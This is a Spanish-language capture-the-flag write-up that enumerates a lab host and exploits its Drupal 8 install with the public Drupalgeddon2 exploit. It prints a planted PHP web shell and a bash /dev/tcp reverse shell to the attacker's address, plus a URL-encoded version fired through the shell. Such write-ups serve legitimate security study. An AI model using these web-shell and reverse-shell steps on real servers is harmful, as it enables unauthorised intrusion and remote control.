## FASE DE ENUMERACIÓN

IP_victima-->172.17.0.2

Vamos a realizar un scaneo de los puertos que tiene abiertos, así como de los servicios y versiones que corren en ellos:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open -oN puertosYservicios 172.17.0.2
```
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2
```
Solo el puerto 80 con una versión apache con alguna que otra vulnerabilidad, haciendo unas pruebas rápidas creo que están sanitizadas

Accedemos a la página y vemos un error 403... con esto, sin nada en el código fuente vamos a hacer un scan de rutas:

```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.17.0.2/' -x php,html,txt,
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/drupal               (Status: 301) [Size: 309] [--> http://172.17.0.2/drupal/]
/.                    (Status: 403) [Size: 285]
/.html                (Status: 403) [Size: 290]
/server-status        (Status: 403) [Size: 298]
Progress: 1102730 / 1102735 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un CMS drupal..interesante, vamos a ver si logramos saber la versión, vamos a mirar las cabeceras:
```bash
 curl -I http://172.17.0.2/drupal/
```
```
X-Generator: Drupal 8 (https://www.drupal.org)
```
Versión 8...y ahora hablo de memoria pereo creo que en la versión 8 ya no se podia saber dentro de ella cual era así pues vamos a buscar un exploit para la versiñon 8

```
https://www.exploit-db.com/exploits/44449
```
```
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
```
drupalgedón...suena a muerte y destrucción del CMS drupal.

## ACCESO

1- En mi caso abrí nano para crear un archivo con el nombre drupalgeddon2.rb
  ```
  nano drupalgeddon2.rb
  ```
2-Ccopiar e script en la parte superior derecha del mismo donde pone "Copy"

3-pegar en el nano con "ctrl"+shift (la tecla de encima del ctrl izq con una flecha hacia arriba)+V

4-Guardar ctrl+V

5-Salir ctrl+X

es un script en ruby, instalo una gema que pide "require 'highline/import'" por si va a darme problemas:

```
 sudo gem install highline
```

y....a probar el script:

```bash
 ruby drupalgeddon2.rb http://172.17.0.2/drupal/
```

```
[i] Fake PHP shell:   curl 'http://172.17.0.2/drupal/shell.php' -d 'c=hostname'
```

desde aquí podemos ejecutar comando:

```
bf7c7f570628>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

intenté lanzarme una reverseshell y no reconoce algunos caracteres, como no estoy seguro si es porque hay que encodear, se que me ha creado un archivo en la ruta "http://172.17.0.2/drupal/shell.php"
asi que lo voy a leer desde el drupalgedon2:

```
bf7c7f570628>> cat shell.php
<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
```
vale si enviamos una consulta al parametro "c" ejecutamos un comando en el sistema.... jeje

vamos a 
```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
cogemos la revershell de nc y la ajustamos un poco quedando asi:

```
bash -c 'bash -i >& /dev/tcp/172.17.0.1/445 0>&1'
```
-172.17.0.1 es mi IP
-445 el puerto que voy a poner a la escucha

me voy a 
```bash
https://www.urlencoder.org/
```
URLencodeo la rev y me queda así:
```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%27%0A
```
nos ponemos a la escucha en el puerto 445:
```
 sudo nc -lvnp 445
```
ahora nos vamos a la página web y vamos a usar el parametro c y nuestra rev:

```bash
http://172.17.0.2/drupal/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%27%0A
```

y estamos dentro!!!



